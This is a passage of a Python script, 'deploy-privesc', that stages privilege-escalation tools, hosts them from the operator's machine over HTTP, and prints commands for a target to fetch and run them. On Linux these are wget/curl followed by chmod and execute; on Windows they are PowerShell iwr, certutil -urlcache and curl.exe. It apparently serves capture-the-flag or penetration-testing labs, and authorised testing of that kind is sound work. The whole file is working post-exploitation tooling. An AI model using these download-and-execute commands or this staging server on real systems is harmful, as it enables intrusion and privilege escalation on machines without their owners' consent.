def load_dotenv(path: str = ".env") -> Dict[str, str]:
    d: Dict[str, str] = {}
    if not os.path.isfile(path):
        return d
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            if s.startswith("export "):
                s = s[7:]
            if "=" not in s:
                continue
            k, v = s.split("=", 1)
            d[k.strip()] = v.strip().strip('"').strip("'")
    return d


def run(cmd: List[str]) -> str:
    try:
        return subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True).strip()
    except Exception:
        return ""


def iface_ip(iface: str) -> Optional[str]:
    o = run(["ip", "-4", "addr", "show", iface])
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/", o)
    return m.group(1) if m else None


def detect_ip() -> str:
    t = iface_ip("tun0")
    if t:
        return t
    o = run(["ip", "-4", "-o", "addr", "show", "up"])
    for line in o.splitlines():
        p = line.split()
        if len(p) < 4:
            continue
        if p[1] == "lo":
            continue
        ip = p[3].split("/")[0]
        if not ip.startswith("127."):
            return ip
    return "127.0.0.1"


def color(s: str, code: str, on: bool) -> str:
    return f"\033[{code}m{s}\033[0m" if on else s


def is_port_free(bind: str, port: int) -> bool:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((bind, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def pick_port(bind: str, start: int) -> int:
    for p in range(start, min(start + 200, 65536)):
        if is_port_free(bind, p):
            return p
    raise RuntimeError("no free port found")


def ensure_cache(path: str):
    os.makedirs(path, exist_ok=True)


def tool_matches(name: str, platform: str, keyword: str) -> bool:
    t = TOOLS[name]
    if platform != "all" and t["platform"] != platform:
        return False
    if keyword:
        blob = f"{name} {t['desc']} {t['platform']}".lower()
        if keyword.lower() not in blob:
            return False
    return True


def list_tools(platform: str, keyword: str):
    for n in sorted(TOOLS):
        if tool_matches(n, platform, keyword):
            t = TOOLS[n]
            print(f"{n:<24} {t['platform']:<8} {t['desc']}")


def resolve_selection(args: argparse.Namespace) -> List[str]:
    selected: List[str] = []
    if args.bundle:
        if args.bundle not in BUNDLES:
            raise ValueError(f"unknown bundle: {args.bundle}")
        selected.extend(BUNDLES[args.bundle])
    if args.tool:
        selected.extend(args.tool)
    selected = sorted(set(selected))
    if args.platform != "all":
        selected = [x for x in selected if TOOLS.get(x, {}).get("platform") == args.platform]
    bad = [x for x in selected if x not in TOOLS]
    if bad:
        raise ValueError(f"unknown tool(s): {', '.join(bad)}")
    return selected


def download_tool(name: str, cache_dir: str, refresh: bool) -> str:
    t = TOOLS[name]
    dst = os.path.join(cache_dir, t["filename"])
    if os.path.isfile(dst) and not refresh:
        return dst
    if not refresh and not os.path.isfile(dst):
        raise RuntimeError(f"missing local cache for {name} ({dst}). Use --refresh to download.")
    url = t["url"]
    with urllib.request.urlopen(url, timeout=30) as r:
        data = r.read()
    with open(dst, "wb") as f:
        f.write(data)
    os.chmod(dst, 0o755)
    return dst


def stage_tools(selected: List[str], cache_dir: str, stage_dir: str, refresh: bool) -> Dict[str, str]:
    os.makedirs(stage_dir, exist_ok=True)
    staged: Dict[str, str] = {}
    for n in selected:
        src = download_tool(n, cache_dir, refresh)
        dst = os.path.join(stage_dir, os.path.basename(src))
        shutil.copy2(src, dst)
        staged[n] = dst
    return staged


def linux_cmds(url: str, fn: str, exec_cmd: str) -> List[str]:
    q = urllib.parse.quote(fn)
    return [
        f"wget -O /tmp/{fn} '{url}/{q}'",
        f"curl -fsSL '{url}/{q}' -o /tmp/{fn}",
        exec_cmd.replace("/tmp/", "/tmp/") if exec_cmd else f"chmod +x /tmp/{fn} && /tmp/{fn}",
    ]


def windows_cmds(url: str, fn: str, exec_cmd: str) -> List[str]:
    q = urllib.parse.quote(fn)
    return [
        f"powershell -c \"iwr -UseBasicParsing '{url}/{q}' -OutFile '{fn}'\"",
        f"certutil -urlcache -split -f {url}/{q} {fn}",
        f"curl.exe -L '{url}/{q}' -o {fn}",
        exec_cmd or f".{os.sep}{fn}",
    ]


def copy_clip(text: str) -> Optional[str]:
    for n, c in [("xclip", ["xclip", "-selection", "clipboard"]), ("xsel", ["xsel", "--clipboard", "--input"]), ("wl-copy", ["wl-copy"])]:
        if shutil.which(n):
            try:
                p = subprocess.Popen(c, stdin=subprocess.PIPE)
                p.communicate(input=text.encode())
                if p.returncode == 0:
                    return n
            except Exception:
                pass
    return None


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, directory=None, **kwargs):
        super().__init__(*args, directory=directory, **kwargs)

    def log_message(self, fmt: str, *args):
        if getattr(self.server, "request_log", False):
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            sys.stderr.write(f"{self.client_address[0]} [{ts}] {fmt % args}\n")

    def do_GET(self):
        super().do_GET()
        if getattr(self.server, "oneshot", False):
            self.server.hit.set()


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True


def parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="deploy-privesc: stage/host privesc tools and generate transfer commands")
    p.add_argument("--cache-dir", default=CACHE_DIR_DEFAULT)
    p.add_argument("--stage-dir", default="./www/privesc")
    p.add_argument("--platform", choices=["linux", "windows", "all"], default="all")
    p.add_argument("--tool", action="append", help="tool name (repeatable)")
    p.add_argument("--bundle", choices=sorted(BUNDLES.keys()))
    p.add_argument("--list", action="store_true")
    p.add_argument("--search", default="")
    p.add_argument("--refresh", action="store_true", help="download/update tools from official sources")
    p.add_argument("--port", type=int, default=int(os.getenv("DEPLOY_PRIVESC_PORT", "8000")))
    p.add_argument("--bind", default="0.0.0.0")
    p.add_argument("--ip", default="")
    p.add_argument("--auto-port", action="store_true")
    p.add_argument("--quiet", choices=["url", "command"], help="quiet output mode")
    p.add_argument("--cmd-platform", choices=["linux", "windows"], default="linux")
    p.add_argument("--cmd-tool", default="", help="tool name for quiet command output")
    p.add_argument("--copy", action="store_true")
    p.add_argument("--log", action="store_true")
    p.add_argument("--oneshot", action="store_true")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--show-refs", action="store_true", help="print GTFOBins/LOLBAS reference links")
    return p


def main() -> int:
    env = load_dotenv()
    args = parser().parse_args()
    color_on = sys.stdout.isatty() and not args.no_color and not args.quiet

    if args.list:
        list_tools(args.platform, args.search)
        return 0

    if args.show_refs:
        for k, v in REFERENCE_LINKS.items():
            print(f"{k}: {v}")
        if not args.tool and not args.bundle:
            return 0

    try:
        selected = resolve_selection(args)
    except ValueError as e:
        print(f"[!] {e}", file=sys.stderr)
        return 1

    if not selected:
        print("[!] Select tools with --tool or --bundle, or use --list", file=sys.stderr)
        return 1

    if args.port < 1 or args.port > 65535:
        print("[!] Invalid --port", file=sys.stderr)
        return 1

    ensure_cache(args.cache_dir)

    stage_dir = os.path.abspath(args.stage_dir)
    os.makedirs(stage_dir, exist_ok=True)

    try:
        staged = stage_tools(selected, args.cache_dir, stage_dir, args.refresh)
    except Exception as e:
        print(f"[!] Staging failed: {e}", file=sys.stderr)
        return 1

    if args.quiet in {"url", "command"}:
        host_ip = args.ip or env.get("tun0_ip") or detect_ip()
        base = f"http://{host_ip}:{args.port}"
        if args.quiet == "url":
            print(base)
            return 0
        tname = args.cmd_tool or selected[0]
        if tname not in staged:
            print(f"[!] cmd tool not staged: {tname}", file=sys.stderr)
            return 1
        meta = TOOLS[tname]
        fn = os.path.basename(staged[tname])
        cmds = linux_cmds(base, fn, meta["exec"]) if args.cmd_platform == "linux" else windows_cmds(base, fn, meta["exec"])
        out = cmds[0]
        if args.copy:
            copy_clip(out)
        print(out)
        return 0

    if not is_port_free(args.bind, args.port):
        if args.auto_port:
            args.port = pick_port(args.bind, args.port + 1)
        else:
            print(f"[!] Port busy: {args.bind}:{args.port}. Use --auto-port.", file=sys.stderr)
            return 1

    host_ip = args.ip or env.get("tun0_ip") or detect_ip()
    base = f"http://{host_ip}:{args.port}"

    box = env.get("box", "-")
    target = env.get("target", "-")
    print(color(f"deploy-privesc | box={box} | target={target}", "36", color_on))
    print(color("=" * 64, "36", color_on))
    print(color("[Selection]", "32", color_on))
    platforms = sorted(set(TOOLS[t]["platform"] for t in selected))
    print(f"Platform(s): {', '.join(platforms)}")
    print("Tools:")
    for t in selected:
        print(f"- {t}: {TOOLS[t]['desc']}")
    print()

    print(color("[Hosting]", "32", color_on))
    print(f"Serving directory: {stage_dir}")
    print(f"Bind address: {args.bind}:{args.port}")
    print(f"Hosting URL: {base}")
    print()

    print(color("[Transfer Commands]", "32", color_on))
    for t in selected:
        fn = os.path.basename(staged[t])
        meta = TOOLS[t]
        print(color(f"{t} ({meta['platform']})", "33", color_on))
        lc = linux_cmds(base, fn, meta["exec"])
        wc = windows_cmds(base, fn, meta["exec"])
        print("  Linux:")
        print(f"    {lc[0]}")
        print(f"    {lc[1]}")
        print(f"    exec: {lc[2]}")
        print("  Windows:")
        print(f"    {wc[0]}")
        print(f"    {wc[1]}")
        print(f"    {wc[2]}")
        print(f"    exec: {wc[3]}")
        print(f"  Expected output: {meta['output']}")
        print()

    print(color("[References]", "32", color_on))
    print(f"GTFOBins: {REFERENCE_LINKS['gtfobins']}")
    print(f"LOLBAS:   {REFERENCE_LINKS['lolbas']}")
    print()

    if args.copy:
        first = selected[0]
        cmd = linux_cmds(base, os.path.basename(staged[first]), TOOLS[first]["exec"])[0]
        tool = copy_clip(cmd)
        if tool:
            print(f"[+] Copied first Linux command via {tool}")
        else:
            print("[!] Clipboard tool not found")

    handler = lambda *a, **kw: Handler(*a, directory=stage_dir, **kw)
    with ThreadedTCPServer((args.bind, args.port), handler) as httpd:
        httpd.request_log = args.log
        httpd.oneshot = args.oneshot
        httpd.hit = threading.Event()
        print(color("[Status]", "32", color_on))
        print("Server running. Press Ctrl-C to stop.")
        if args.oneshot:
            t = threading.Thread(target=httpd.serve_forever, daemon=True)
            t.start()
            httpd.hit.wait()
            print("One-shot download observed. Stopping.")
            httpd.shutdown()
            return 0
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass

    return 0


if __name__ == "__main__":
    sys.exit(main())
